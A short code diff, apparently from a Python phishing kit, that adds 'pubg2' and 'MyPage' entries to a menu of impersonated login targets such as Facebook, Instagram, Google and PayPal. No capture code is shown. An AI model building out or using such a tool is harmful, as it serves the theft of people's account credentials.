@@ -37,8 +37,8 @@ B#|/       \\_______/\\_______)|/     \\|\\_______/|/    )_)(_______)
 |  [01] - facebook     [06] - instafollowers   [11] - Reddit G# |
 |  [02] - instagram    [07] - github           [12] - pubg   G# |
 |  [03] - one.com      [08] - yahoo            [13] - clash  G# |
-|  [04] - google       [09] - wordpress        [14] - none   G# |
-|  [05] - paypal       [10] - twitter          [15] - none   G# |
+|  [04] - google       [09] - wordpress        [14] - pubg2  G# |
+|  [05] - paypal       [10] - twitter          [15] - MyPage G# |
 |                                                             |
 ╚-------------------------------------------------------------╝
 '''
@@ -74,7 +74,7 @@ class main(Gr):
 		11:'Reddit',
 		12:'pubg',
 		13:'Clash',
-		14:'',
+		14:'pubg2',
 		15:'',
 					}
 		try:
